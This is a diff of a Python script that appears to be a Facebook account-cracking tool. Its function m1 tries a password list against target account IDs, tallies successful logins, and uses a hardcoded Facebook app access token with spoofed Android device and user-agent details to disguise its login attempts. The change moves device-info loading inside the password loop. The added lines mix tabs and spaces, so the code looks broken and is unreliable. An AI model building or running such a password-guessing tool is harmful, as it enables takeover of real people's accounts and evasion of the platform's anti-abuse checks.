@@ -342,15 +342,6 @@ def m1(ids,passlist):
         global loop
         global oks
         sys.stdout.write('\r\r\033[1;37m [MR-ZEE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-	infos = open('device_info.txt','r').read()
-        try:
-                version_,model_,brand_name_,width_,height_,build_,operator_,density_=infos.split('$')
-        except:
-                version_ = str(random.randint(7,13))
-                model_ = "Infinix"
-                brand_name_ = "Infinix"
-                width_ = "720"
-                height_ = "1280"
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -371,6 +362,15 @@ def m1(ids,passlist):
                         fbrv = '0'
                         fban = 'FB4A'
                         fbpn = 'com.facebook.katana'
+			infos = open('device_info.txt','r').read()
+        		try:
+                		version_,model_,brand_name_,width_,height_,build_,operator_,density_=infos.split('$')
+        		except:
+                		version_ = str(random.randint(7,13))
+                		model_ = "Infinix"
+                		brand_name_ = "Infinix"
+                		width_ = "720"
+                		height_ = "1280"
                         ua = 'Davik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
